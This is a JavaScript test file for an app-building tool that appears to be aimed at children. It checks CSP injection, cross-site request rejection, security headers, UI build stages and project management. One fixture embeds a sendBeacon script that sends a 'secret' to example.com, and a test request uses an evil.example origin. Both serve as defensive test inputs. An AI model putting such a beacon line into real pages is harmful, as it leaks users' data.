import assert from "node:assert/strict";
import test from "node:test";
import { readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { browserSecurityHeaders, isSameOriginMutation, PREVIEW_CSP, securePreviewHtml } from "../scripts/security.mjs";

const page = '<!doctype html><html><head><title>Game</title></head><body><script>navigator.sendBeacon("//example.com", "secret")</script></body></html>';
const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");

test("preview HTML receives a deny-by-default CSP before generated content", () => {
  const secured = securePreviewHtml(page);
  assert.match(secured, /<head><meta http-equiv="Content-Security-Policy"/);
  assert.ok(secured.indexOf("Content-Security-Policy") < secured.indexOf("sendBeacon"));
  assert.match(PREVIEW_CSP, /connect-src 'none'/);
  assert.match(PREVIEW_CSP, /form-action 'none'/);
  assert.match(PREVIEW_CSP, /frame-src 'none'/);
});

test("cross-site mutations are rejected", () => {
  assert.equal(isSameOriginMutation({ method: "POST", headers: { host: "pi.local:3000", origin: "http://pi.local:3000", "sec-fetch-site": "same-origin" } }), true);
  assert.equal(isSameOriginMutation({ method: "POST", headers: { host: "pi.local:3000", origin: "https://evil.example", "sec-fetch-site": "cross-site" } }), false);
});

test("main responses disable sensitive browser capabilities", () => {
  const headers = browserSecurityHeaders();
  assert.match(headers["content-security-policy"], /frame-ancestors 'none'/);
  assert.match(headers["permissions-policy"], /microphone=\(\)/);
  assert.equal(headers["referrer-policy"], "no-referrer");
});

test("Builder Bunny uses streamed, real supervision stages", async () => {
  const [server, ui, bunny] = await Promise.all([
    readFile(path.join(root, "server.mjs"), "utf8"),
    readFile(path.join(root, "public/index.html"), "utf8"),
    readFile(path.join(root, "public/builder-bunny.svg"), "utf8")
  ]);
  for (const stage of ["building", "checking", "reviewing", "fixing", "finishing", "saving"]) {
    assert.ok(server.includes(`"${stage}"`), `server should emit the ${stage} stage`);
    assert.match(ui, new RegExp(`${stage}:\\[`));
  }
  assert.match(ui, /apiStream/);
  assert.match(bunny, /<svg/);
  assert.match(bunny, /Builder Bunny/);
  const messagesStart = ui.indexOf('<div class="messages" id="messages"');
  const bunnyPosition = ui.indexOf('id="buildBunny"');
  const composerStart = ui.indexOf('<form class="composer"');
  assert.ok(messagesStart < bunnyPosition && bunnyPosition < composerStart, "Builder Bunny should live inside the chat history");
  assert.doesNotMatch(ui, /\.build-bunny\s*\{[^}]*position\s*:\s*absolute/);
  assert.doesNotMatch(ui, /addMessage\("thinking"/);
  const busyHandler = ui.slice(ui.indexOf("function setBusy"), ui.indexOf("function clearPendingVersion"));
  assert.doesNotMatch(busyHandler, /preview|iframe|pointerEvents/, "busy state should not disable the current app");
});

test("approved app versions wait for the child before replacing the preview", async () => {
  const [server, ui] = await Promise.all([
    readFile(path.join(root, "server.mjs"), "utf8"),
    readFile(path.join(root, "public/index.html"), "utf8")
  ]);
  assert.match(server, /published: result\.published/);
  assert.match(ui, /New version available/);
  assert.match(ui, /id="loadUpdate"/);
  const submitHandler = ui.slice(ui.indexOf('$("chatForm").addEventListener'), ui.indexOf("async function start"));
  assert.match(submitHandler, /if\(result\.published\)setPendingVersion\(result\.html\)/);
  assert.doesNotMatch(submitHandler, /srcdoc=result\.html/);
  const pendingHandlers = ui.slice(ui.indexOf("function clearPendingVersion"), ui.indexOf("function renderMessages"));
  assert.match(pendingHandlers, /srcdoc=pendingVersion\.html/);
  assert.match(pendingHandlers, /updateReady.*hidden=true/);
  assert.match(ui, /loadUpdate.*addEventListener\("click",loadPendingVersion\)/);
});

test("project rename and deletion are explicit, scoped, and build-safe", async () => {
  const [server, ui] = await Promise.all([
    readFile(path.join(root, "server.mjs"), "utf8"),
    readFile(path.join(root, "public/index.html"), "utf8")
  ]);
  assert.match(server, /req\.method === "PATCH" && !action/);
  assert.match(server, /req\.method === "DELETE" && !action/);
  assert.match(server, /activeRuns\.has\(id\).*before renaming/s);
  assert.match(server, /activeRuns\.has\(id\).*before deleting/s);
  assert.match(server, /await rm\(dir, \{ recursive: true \}\)/);
  assert.match(server, /recordProjectManagement\(project\.meta, "delete"\)/);
  assert.match(ui, /id="renameDialog"/);
  assert.match(ui, /id="deleteDialog"/);
  assert.match(ui, /permanently deletes the app and its chat/);
  assert.match(ui, /method:"PATCH"/);
  assert.match(ui, /method:"DELETE"/);
  assert.match(ui, /aria-label.*Rename/);
  assert.match(ui, /aria-label.*Delete/);
});

test("quota exhaustion reaches the child while logo generation has a safe fallback", async () => {
  const server = await readFile(path.join(root, "server.mjs"), "utf8");
  assert.match(server, /diagnosticOutput/);
  assert.match(server, /failure === "quota"/);
  assert.match(server, /KIDDO_AGENT_ACTION_REQUIRED/);
  assert.match(server, /reply: error\.code === "KIDDO_AGENT_ACTION_REQUIRED"/);
  assert.match(server, /writeFile\(stagedLogoFile, starterLogoSvg\(project\.meta\.name\)\)/);
  assert.match(server, /safe starter logo is already present/);
});
